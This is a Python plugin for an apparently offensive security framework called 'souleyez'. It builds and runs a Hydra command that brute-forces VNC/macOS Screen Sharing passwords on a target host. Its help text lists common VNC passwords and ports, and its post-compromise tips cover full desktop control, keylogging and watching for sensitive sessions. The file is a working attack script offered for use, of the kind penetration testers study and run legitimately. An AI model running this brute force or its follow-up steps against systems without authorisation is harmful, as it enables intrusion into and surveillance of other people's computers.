#!/usr/bin/env python3
"""
souleyez.plugins.vnc_brute

VNC brute force plugin using Hydra.
Attacks VNC/Screen Sharing on macOS systems.
"""

import subprocess
import time
from typing import List

from souleyez.security.validation import ValidationError, validate_target

from .plugin_base import PluginBase

HELP = {
    "name": "VNC Brute — Screen Sharing Attack",
    "description": (
        "Brute force VNC/Screen Sharing password on macOS.\n\n"
        "macOS Screen Sharing (VNC) can use:\n"
        "- VNC-only password (separate from user accounts)\n"
        "- macOS user credentials\n\n"
        "This plugin tests common VNC passwords.\n\n"
        "Quick tips:\n"
        "- VNC password is often simpler than user passwords\n"
        "- Many users reuse their login password for VNC\n"
        "- Some systems have no VNC password at all!\n"
        "- Success gives full screen control\n"
    ),
    "usage": "souleyez jobs enqueue vnc_brute <target>",
    "examples": [
        "souleyez jobs enqueue vnc_brute 192.168.1.100",
        'souleyez jobs enqueue vnc_brute 192.168.1.100 --args "--port 5901"',
    ],
    "flags": [
        ["--port PORT", "VNC port (default: 5900)"],
    ],
    "presets": [
        {"name": "Standard VNC", "args": [], "desc": "Port 5900"},
        {"name": "Display :1", "args": ["--port", "5901"], "desc": "Port 5901"},
    ],
    "help_sections": [
        {
            "title": "What is VNC Brute Force?",
            "color": "cyan",
            "content": [
                (
                    "Overview",
                    [
                        "Brute forces VNC/Screen Sharing password authentication",
                        "Uses Hydra with common VNC passwords",
                        "Targets graphical remote access to systems",
                    ],
                ),
                (
                    "VNC Authentication Types",
                    [
                        "VNC-only password (separate from user accounts)",
                        "macOS user credentials (Screen Sharing)",
                        "No authentication (dangerous but common!)",
                    ],
                ),
            ],
        },
        {
            "title": "Usage & Examples",
            "color": "green",
            "content": [
                (
                    "Basic Usage",
                    [
                        "souleyez jobs enqueue vnc_brute 192.168.1.100",
                        "  → Tests common VNC passwords on port 5900",
                    ],
                ),
                (
                    "Custom Port",
                    [
                        'souleyez jobs enqueue vnc_brute 192.168.1.100 --args "--port 5901"',
                        "  → Tests VNC on display :1 (port 5901)",
                    ],
                ),
            ],
        },
        {
            "title": "Tips & Common Passwords",
            "color": "yellow",
            "content": [
                (
                    "Common VNC Passwords",
                    [
                        "password, vnc, 123456, admin",
                        "Often same as login password",
                        "Many systems use blank password (no auth!)",
                        "8 character max on traditional VNC",
                    ],
                ),
                (
                    "VNC Ports to Check",
                    [
                        "5900 - Display :0 / macOS Screen Sharing",
                        "5901 - Display :1",
                        "5800 - Java VNC (browser-based)",
                    ],
                ),
                (
                    "After Success",
                    [
                        "Use vnc_access to connect interactively",
                        "Full graphical desktop control",
                        "Can view files, run programs, keylog",
                        "Watch for open sessions with sensitive data",
                    ],
                ),
            ],
        },
    ],
}


class VNCBrutePlugin(PluginBase):
    name = "VNC Brute"
    tool = "hydra"
    category = "exploitation"
    HELP = HELP

    def _get_wordlist_path(self, filename: str) -> str:
        """Get path to wordlist file."""
        from souleyez.wordlists import resolve_wordlist_path

        return resolve_wordlist_path(f"data/wordlists/{filename}")

    def build_command(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ):
        """Build Hydra command for VNC brute force."""
        args = args or []

        try:
            target = validate_target(target)
        except ValidationError as e:
            if log_path:
                with open(log_path, "w") as f:
                    f.write(f"ERROR: Invalid target: {e}\n")
            return None

        port = "5900"
        i = 0
        while i < len(args):
            if args[i] == "--port" and i + 1 < len(args):
                port = args[i + 1]
                i += 2
            else:
                i += 1

        passwords = self._get_wordlist_path("vnc_passwords.txt")

        cmd = [
            "hydra",
            "-P",
            passwords,
            "-s",
            port,
            "-t",
            "2",
            "-w",
            "3",
            "-vV",
            "-f",
            target,
            "vnc",
        ]

        return {"cmd": cmd, "timeout": 1800}

    def run(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ) -> int:
        """Execute VNC brute force."""
        cmd_spec = self.build_command(target, args, label, log_path)
        if cmd_spec is None:
            return 1

        cmd = cmd_spec["cmd"]

        if log_path:
            with open(log_path, "w") as f:
                f.write(f"# VNC Brute Force on {target}\n")
                f.write(f"# Command: {' '.join(cmd)}\n")
                f.write(f"# Started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")

        try:
            with open(log_path, "a") as f:
                result = subprocess.run(
                    cmd, stdout=f, stderr=subprocess.STDOUT, timeout=cmd_spec["timeout"]
                )
            return result.returncode
        except subprocess.TimeoutExpired:
            if log_path:
                with open(log_path, "a") as f:
                    f.write("\n\n# ERROR: Brute force timed out\n")
            return 124
        except Exception as e:
            if log_path:
                with open(log_path, "a") as f:
                    f.write(f"\n\n# ERROR: {e}\n")
            return 1


plugin = VNCBrutePlugin()
